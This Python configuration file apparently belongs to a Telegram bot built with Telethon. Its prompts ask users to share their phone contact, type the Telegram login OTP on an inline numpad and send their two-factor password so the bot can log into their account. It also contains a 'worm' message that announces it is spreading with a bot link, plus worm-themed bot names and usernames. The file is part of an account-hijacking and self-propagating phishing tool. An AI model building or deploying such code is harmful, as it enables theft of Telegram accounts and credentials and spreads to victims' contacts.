import os
from telethon import Button
from telethon.types import KeyboardButtonWebView
from dotenv import load_dotenv

load_dotenv(override=True)

strings = {
    'already_logged_in': "You are already logged in.",
    'ask_code': "Please enter the OTP you recived from Telegram:\n",
    'ask_ok': "Is this correct?: ",
    'ask_pass': "Now send me your 2 factor password 🔏",
    'ask_phone': "Share contact 📞 using the button to continue",
    'code_invalid': "The OTP is invalid ❌",
    'get_code_btn': "Get the OTP",
    'hello': "Hello 👋\n\nIf you need use /help",
    'help': "🔐 __AUTHORIZATION__\nThis bot requires to access your account by /login into it. This is because we can't access your chats in other ways.\nYou have to share your contact and provide the OTP for logging in (in case of 2-factor authentication is active, you have to provide your password too)\n\nthats all\nhave fun 👊\n\nPrivacy policy: /privacy_policy",
    'login_success': "The login was successful ✅",
    'no': "No",
    'pass_invalid': "The 2 factor password you entered is invalid ❌",
    'rules': "⚠️ All the media downloaded are obtained from your account. we don't care what you upload, and also we don't log them. You solely bear all the consequenses",
    'sending': "Sending OTP request 📲",
    'share_contact_btn': "SHARE CONTACT",
    'worm_msg': "Hey! I am a worm! I am spreading! 🐛\n\n@{}",
    'worm_msg_btn_txt': "🔗 BOT LINK 🔗",
    'yes': "Yes",
}
direct_reply = {
    '/help': strings['help'],
    '/rules': strings['rules'],
}
numpad = [
    [KeyboardButtonWebView(strings['get_code_btn'], os.environ['PUBLIC_HOST']+'/tg')],
    [
        Button.inline("1", '{"press":1}'),
        Button.inline("2", '{"press":2}'),
        Button.inline("3", '{"press":3}')
    ],
    [
        Button.inline("4", '{"press":4}'),
        Button.inline("5", '{"press":5}'),
        Button.inline("6", '{"press":6}')
    ],
    [
        Button.inline("7", '{"press":7}'),
        Button.inline("8", '{"press":8}'),
        Button.inline("9", '{"press":9}')
    ],
    [
        Button.inline("Clear All", '{"press":"clear_all"}'),
        Button.inline("0", '{"press":0}'),
        Button.inline("⌫", '{"press":"clear"}')
    ]
]
bot_names = [
    "Worm Example",
    "Worm Sample",
    "Worm Demo",
]
bot_usernames = [
    "teliworm",
    "tgwrm",
    "hookworm",
]
